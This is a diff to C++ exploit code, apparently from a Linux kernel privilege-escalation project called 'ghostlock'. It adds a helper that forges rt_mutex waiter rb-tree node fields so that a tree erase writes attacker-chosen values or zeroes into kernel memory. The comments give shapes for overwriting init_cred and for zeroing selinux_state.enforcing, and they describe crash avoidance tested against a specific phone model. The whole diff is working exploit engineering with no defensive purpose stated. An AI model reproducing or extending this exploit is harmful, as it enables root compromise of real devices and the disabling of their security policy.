@@ -46,6 +46,59 @@ namespace ghostlock::memory {
     static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
     static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);
 
+    /* The three words that make the waiter's tree entry the write vehicle:
+     * {__rb_parent_color, rb_right, rb_left}. Both the route's stack-waiter stamp
+     * and the compact encoder must place the same triple -- this is the single
+     * source of truth for it.
+     *
+     * Two shapes, and both of them perform the write inside the erase while
+     * leaving the lock's waiter tree root alone. That last property is not
+     * decoration: the walk's [7] does `rt_mutex_dequeue()` and then
+     * `rt_mutex_enqueue()` on the same lock, and the enqueue's inlined
+     * `while (*link)` descent starts at that root. A root left pointing at a task
+     * field is fatal, because the descent reads the "node's" children out of task
+     * memory and chases them (captured twice: rt_mutex_adjust_prio_chain+0x548,
+     * faults at garbage+0x40, 2026-10-09 runs Q1 and Q2).
+     *
+     *  - pointer layouts (page-derived / init_cred). The erase arm "the child is
+     *    node->rb_left" stores pc at rb_left and re-parents through
+     *    __rb_parent(pc) = pc & ~3, so the collateral lands in that pointer's
+     *    child slot, never on the root. Shape: {pc = value, right = 0,
+     *    left = target}. The value's low byte is load-bearing -- W1 needs byte 0
+     *    == 0x00 for selinux_state.enforcing.
+     *
+     *  - leaf/zero. The node has NO children, so that arm does not apply and no
+     *    value is stored at all: with rb_left == rb_right == 0 the whole effect is
+     *    __rb_change_child(node, NULL, parent = pc & ~3, root), which writes NULL
+     *    at parent->rb_left or parent->rb_right (or, when parent == 0, only clears
+     *    the root -- the parking shape). Shape: {pc = target - 8, right = 0,
+     *    left = 0}. Then:
+     *      * parent = target - 8 != 0, so the tree root is never polluted;
+     *      * parent->rb_left is the task word at target - 8, which would have to
+     *        be exactly the erased node for the store to go anywhere else, so it
+     *        takes the else arm and writes NULL at parent + 8 = *(target) -- the
+     *        zero write;
+     *      * the enqueue's descent reads the node's own children, both 0, and
+     *        exits on its first test whatever `less()` decides, so
+     *        rb_link_node() gives it a NULL parent and rb_insert_color() breaks
+     *        on its `!parent` arm.
+     *    This is the shape the working CPH2521 reference uses ({pc = target-8,
+     *    right = value, left = 0}) with value == 0, and what this file's own
+     *    layout always meant ("Value 0 uses pc = dest-8 (stores 0 at *dest)"). */
+    struct WaiterTreeStamp final {
+        std::uintptr_t pc = 0;
+        std::uintptr_t right = 0;
+        std::uintptr_t left = 0;
+    };
+
+    [[nodiscard]] constexpr WaiterTreeStamp waiter_tree_stamp(
+        const PayloadWriteLayout &layout) noexcept {
+        if (layout.right) {
+            return {.pc = layout.right, .right = 0, .left = layout.left};
+        }
+        return {.pc = layout.parent, .right = layout.right, .left = layout.left};
+    }
+
     /* Fixed payload fragment sizes shared by the encoders and their callers. */
     inline constexpr std::size_t kCompactWaiterBytes = 0x30;
 
